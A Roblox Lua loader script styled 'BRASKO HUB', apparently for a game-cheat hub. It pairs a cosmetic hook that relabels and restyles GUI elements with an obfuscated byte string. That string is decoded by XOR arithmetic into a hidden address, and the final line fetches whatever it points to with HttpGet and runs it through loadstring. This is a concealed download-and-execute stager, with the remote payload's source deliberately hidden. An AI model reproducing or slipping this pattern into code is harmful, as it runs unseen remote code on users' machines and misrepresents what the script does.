
--[[ STAGE 2: VISUAL CORE ]]
local ccwocfQCbR_lSGbF="\239\248\253\254\128\206\198\203\141\131\154\208\140\151\161\154\170\154\172\179\166\182\170\187\185\064\180\064\079\138\066\083\082\149\091\095\093\087\096\093\106\099\115\123\111\185\115\000\126\121\006\023\002\012\017\091\026\019\024\032\100\010\032\059\032\026\044\058\054\055\202\061\056\049\211\205\219\211\227\211\054\234\220\232\226\225\048\235\223\251\130\128\254\131\147\131\239\159\143\143\165\231\229\155\140\173\180\180\168\179\174\180\133\132\189\149\145\069\154\148\091\103\080"local yZuyEuEpBVvWUkrk=195 local vjy_3W9hmsP42iNIMd8bbC=179 local aHE3a9VSOYdlsc_EJ=1 local nvh7niK2iuWT=3 local KwmWHCkzBdMgCvtdVC=14 local niuvNL9qnfzIH2e3VjZm=false local ivF2kbW1_mtj=bit32 and bit32.bxor if not ivF2kbW1_mtj then ivF2kbW1_mtj=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local y22UYx7Z_TqisPShhy={}for G8AOn15LyA_LHWX=1,#ccwocfQCbR_lSGbF do local sZGcUOx6zkhKFB7BcKICh=string.byte(ccwocfQCbR_lSGbF,G8AOn15LyA_LHWX)local hmtECGBDUKcZRdH5=(vjy_3W9hmsP42iNIMd8bbC+(G8AOn15LyA_LHWX*nvh7niK2iuWT)+KwmWHCkzBdMgCvtdVC)%256 if aHE3a9VSOYdlsc_EJ==0 then sZGcUOx6zkhKFB7BcKICh=(sZGcUOx6zkhKFB7BcKICh-hmtECGBDUKcZRdH5)%256 y22UYx7Z_TqisPShhy[G8AOn15LyA_LHWX]=string.char(ivF2kbW1_mtj(sZGcUOx6zkhKFB7BcKICh,yZuyEuEpBVvWUkrk))else sZGcUOx6zkhKFB7BcKICh=ivF2kbW1_mtj(sZGcUOx6zkhKFB7BcKICh,yZuyEuEpBVvWUkrk)y22UYx7Z_TqisPShhy[G8AOn15LyA_LHWX]=string.char((sZGcUOx6zkhKFB7BcKICh-hmtECGBDUKcZRdH5)%256)end end local a8MmUrLUtF4oxXp2HL4=table.concat(y22UYx7Z_TqisPShhy)if niuvNL9qnfzIH2e3VjZm then a8MmUrLUtF4oxXp2HL4=string.reverse(a8MmUrLUtF4oxXp2HL4)end local FYv9OmYiTe5hcX_ejTylk=a8MmUrLUtF4oxXp2HL4
local HubName = "BRASKO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(FYv9OmYiTe5hcX_ejTylk))()
